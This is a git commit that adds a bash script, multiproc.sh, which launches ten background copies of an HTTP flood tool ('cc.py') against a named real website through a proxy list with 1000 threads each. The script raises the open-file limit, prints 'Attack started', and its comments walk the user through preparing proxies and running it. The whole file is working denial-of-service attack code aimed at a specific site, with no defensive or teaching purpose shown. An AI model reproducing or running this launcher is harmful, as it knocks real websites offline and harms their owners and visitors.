074d0b3f8e7394e68a5a56b507532f8b185267bb
Faizan Rahman <33825287+mfar1984@users.noreply.github.com>
2024-06-29 17:43:55 +0800

    Add files via upload

---
+++ multiproc.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+#
+#  Please prepared proxies list at first.
+#  And then change the command in atk_cmd
+#  And change the process number
+#  Lastly run this script
+#
+#the command you want to exec
+atk_cmd="python3 cc.py -url https://aliffchannel.com -f proxy.txt -v http -t 1000"
+
+#number of process that you want
+process=10
+
+#change the system limit
+ulimit -n 999999
+
+echo Attack started
+for ((i=1;i<=$process;i++))
+do
+  $atk_cmd >/dev/null &
+  sleep 0.1
+done
